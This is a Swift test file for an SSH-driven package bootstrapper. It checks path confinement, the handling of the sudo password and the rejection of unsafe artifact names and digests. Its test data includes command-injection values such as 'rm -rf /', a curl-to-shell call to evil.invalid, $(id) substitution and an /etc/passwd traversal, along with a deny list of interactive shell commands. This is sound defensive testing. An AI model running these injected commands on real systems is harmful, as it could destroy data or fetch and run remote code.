import Foundation
import Testing

@testable import SparkBootstrap

/// Reject unchecked manifest values at the fixed-command SSH execution boundary.

private let operationID = UUID(uuidString: "8ADF6E19-1E1F-4A2C-9A62-4B3E9E2E0C11")!

private func parameters(
    name: String = "spark-runtime_0.1.0-1_arm64.deb",
    digest: String = String(repeating: "a", count: 64),
    size: Int64 = 4096
) throws -> BootstrapCommand.Parameters {
    try BootstrapCommand.Parameters(
        operationID: operationID,
        artifactName: name,
        sha256: digest,
        size: size
    )
}

@Test func everyCommandRendersInsideTheOperationDirectory() throws {
    let parameters = try parameters()
    let work = "/tmp/spark-bootstrap/8adf6e19-1e1f-4a2c-9a62-4b3e9e2e0c11"
    #expect(parameters.workDirectory == work)

    for command in allCommands {
        let line = command.line(parameters)
        #expect(!line.isEmpty)
        // Restrict paths outside the work directory to fixed installed-package locations.
        let allowedAbsolutePrefixes = [
            work, "/usr/lib/spark-runtime", "/usr/share/spark-runtime", "/var/lib/spark-runtime",
        ]
        for token in line.split(separator: " ") where token.hasPrefix("/") {
            #expect(
                allowedAbsolutePrefixes.contains { token.hasPrefix($0) },
                "\(command) reaches outside the operation directory: \(token)"
            )
        }
    }
}

private let allCommands: [BootstrapCommand] = [
    .prepareWorkDirectory, .verifyDigest, .verifyDetachedSignature,
    .verifyAgainstInstalledTrustRoot, .installPackage, .enablePrivilegedHelper,
    .enableRuntime, .bootstrapOwner, .cleanUp,
]

@Test func theWorkingDirectoryIsPrivateToTheOperation() throws {
    let line = BootstrapCommand.prepareWorkDirectory.line(try parameters())
    #expect(line.contains("-m 0700"), "the working directory must not be world-readable")
}

@Test func elevatedCommandsNeverPutThePasswordInAnArgument() throws {
    let parameters = try parameters()
    for command in allCommands where command.requiresElevation {
        let line = command.line(parameters)
        #expect(line.contains("sudo -S -p ''"), "\(command) must read the password from stdin")
        // Pass sudo credentials through stdin rather than visible process arguments.
        #expect(!line.contains("--stdin"), "\(command) uses the wrong sudo flag")
        #expect(!line.lowercased().contains("password"))
    }
    for command in allCommands where !command.requiresElevation {
        #expect(!command.line(parameters).contains("sudo"), "\(command) does not need sudo")
    }
}

@Test func noCommandOpensAShellOrATerminal() throws {
    let parameters = try parameters()
    // Exclude interactive shells and editors from the bounded installer command set (§11.4).
    let forbidden = ["bash -i", "sh -i", "/bin/bash", "/bin/sh -", "login", "su -", "vi ", "nano "]
    for command in allCommands {
        let line = command.line(parameters)
        for needle in forbidden {
            #expect(!line.contains(needle), "\(command) looks like it opens a shell: \(line)")
        }
    }
}

@Test func aDigestIsTheOnlyThingInterpolatedIntoTheDigestCheck() throws {
    let digest = String(repeating: "b", count: 64)
    let line = BootstrapCommand.verifyDigest.line(try parameters(digest: digest))
    #expect(line.contains(digest))
    #expect(line.contains("sha256sum -c --status"))
}

@Test func artifactNamesThatCouldEndAWordAreRejected() throws {
    // Each of these would be a different command if it reached a shell.
    let hostile = [
        "spark; rm -rf /.deb",
        "spark && curl evil.invalid | sh.deb",
        "spark`id`.deb",
        "spark$(id).deb",
        "spark|id.deb",
        "spark\nid.deb",
        "spark id.deb",
        "spark'.deb",
        "spark\".deb",
        "../../etc/passwd.deb",
        "/etc/passwd.deb",
        "spark$IFS.deb",
        ".hidden.deb",
        "spark.deb ",
    ]
    for name in hostile {
        #expect(
            throws: BootstrapCommandError.unsafeArtifactName(name),
            "an artifact named \(name) must be refused"
        ) {
            _ = try parameters(name: name)
        }
    }
}

@Test func onlyDebianPackagesAreAccepted() throws {
    for name in ["spark-runtime", "spark-runtime.tar.gz", "spark-runtime.deb.sh", ""] {
        #expect(throws: BootstrapCommandError.self) { _ = try parameters(name: name) }
    }
    #expect(BootstrapCommand.isSafeArtifactName("spark-runtime_0.1.0-1_arm64.deb"))
    #expect(BootstrapCommand.isSafeArtifactName("spark+extras_1.0.0_arm64.deb"))
}

@Test func aNameLongerThanAFilesystemAllowsIsRejected() throws {
    let long = String(repeating: "a", count: 200) + ".deb"
    #expect(throws: BootstrapCommandError.unsafeArtifactName(long)) {
        _ = try parameters(name: long)
    }
}

@Test func digestsThatAreNotDigestsAreRejected() throws {
    let hostile = [
        String(repeating: "a", count: 63),
        String(repeating: "a", count: 65),
        String(repeating: "A", count: 64),
        "a" + String(repeating: "z", count: 63),
        "$(id)" + String(repeating: "a", count: 59),
        "",
    ]
    for digest in hostile {
        #expect(throws: BootstrapCommandError.unsafeDigest(digest)) {
            _ = try parameters(digest: digest)
        }
    }
}

@Test func aZeroOrNegativeSizeIsRejected() throws {
    #expect(throws: BootstrapCommandError.unsafeSize(0)) { _ = try parameters(size: 0) }
    #expect(throws: BootstrapCommandError.unsafeSize(-1)) { _ = try parameters(size: -1) }
}

@Test func theInstalledTrustRootCheckSaysWhenItDidNotRun() throws {
    let line = BootstrapCommand.verifyAgainstInstalledTrustRoot.line(try parameters())
    // Report absent installed trust separately from successful verification.
    #expect(line.contains("spark-bootstrap-no-installed-trust-root"))
    #expect(line.contains("/usr/share/spark-runtime/trust/release-keys.json"))
}

@Test func cleanUpRemovesOnlyTheOperationDirectory() throws {
    let parameters = try parameters()
    let line = BootstrapCommand.cleanUp.line(parameters)
    #expect(line == "rm -rf \(parameters.workDirectory)")
    #expect(line.contains(operationID.uuidString.lowercased()))
}

@Test func everyCommandHasHumanReadableProgressText() {
    for command in allCommands {
        #expect(!command.summary.isEmpty)
        #expect(command.summary.first?.isUppercase == true)
    }
}
